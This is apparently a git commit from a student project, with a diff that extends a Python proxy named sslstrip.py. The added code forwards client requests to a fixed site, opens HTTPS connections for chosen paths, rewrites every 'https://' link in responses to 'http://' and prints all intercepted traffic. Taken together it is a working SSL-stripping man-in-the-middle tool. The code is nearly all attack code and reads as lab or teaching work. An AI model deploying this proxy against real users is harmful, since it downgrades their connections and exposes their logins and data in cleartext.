b83191ea1fc560a1bc39dc527e89ef667d13bcb5
Simon Duret <simon.duret@etu.u-bordeaux.fr>
2018-01-27 19:04:16 +0100

    sslstrip.py: handle SSL/TLS stripping

--- sslstrip/sslstrip.py
+++ sslstrip/sslstrip.py
@@ -13,12 +13,17 @@ __status__  = 'Development'
 
 
 import socket
+import ssl
+import sys
+import re
 
-FORWARD_HOST = 'www.t0x0sh.org'
-FORWARD_PORT = 80
-PROXY_HOST = '127.0.0.1'
-PROXY_PORT = 4242
-BUFFER_SIZE = 65537
+HTTPS_URL           = [b'/index.html']
+FORWARD_HOST        = 'www.t0x0sh.org'
+FORWARD_HTTP_PORT   = 80
+FORWARD_HTTPS_PORT  = 443
+PROXY_HOST          = '127.0.0.1'
+PROXY_PORT          = 4242
+BUFFER_SIZE         = 65537
 
 class SSLstrip:
     def __listen(self):
@@ -30,25 +35,50 @@ class SSLstrip:
         sock.listen(5)
         self.__sock = sock
 
+    def __https_sock(self):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        ssl_ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
+        sock = ssl_ctx.wrap_socket(sock, server_hostname=FORWARD_HOST)
+        sock.connect((FORWARD_HOST, FORWARD_HTTPS_PORT))
+        sock.settimeout(2)
+        return sock
+
+    def __http_sock(self):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((FORWARD_HOST, FORWARD_HTTP_PORT))
+        sock.settimeout(2)
+        return sock
+
+    def __replace_https_to_http(self, data):
+        return re.sub(b'https://', b'http://', data)
+
     def __handle_client(self, csock, fromaddr):
         """ Handle clients connections, and forward requests.
         """
-        fw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        fw_sock.connect((FORWARD_HOST, FORWARD_PORT))
-
         csock.settimeout(2)
-        fw_sock.settimeout(2)
+        fw_sock = None
 
         while True:
             data = csock.recv(BUFFER_SIZE)
             if len(data) == 0:
-                fw_sock.close()
+                if fw_sock is not None:
+                    fw_sock.close()
                 break
+
+            print(data)
+
+            if fw_sock is None:
+                m = re.search(b'(GET|POST) (\S+) HTTP/\d.\d', data)
+                if m is not None and m.group(2) in HTTPS_URL:
+                    fw_sock = self.__https_sock()
+                else:
+                    fw_sock = self.__http_sock()
 
             fw_sock.send(data)
 
             data = fw_sock.recv(BUFFER_SIZE)
             while len(data) > 0:
+                data = self.__replace_https_to_http(data)
                 csock.send(data)
                 data = fw_sock.recv(BUFFER_SIZE)
 
@@ -63,8 +93,9 @@ class SSLstrip:
 
             try:
                 self.__handle_client(csock, fromaddr)
-            except:
-                print("Timeout...")
+            except Exception as e:
+                print("error:", e)
+
             csock.close()
             print("Client %s:%d deconnected" % (caddr, cport))
 
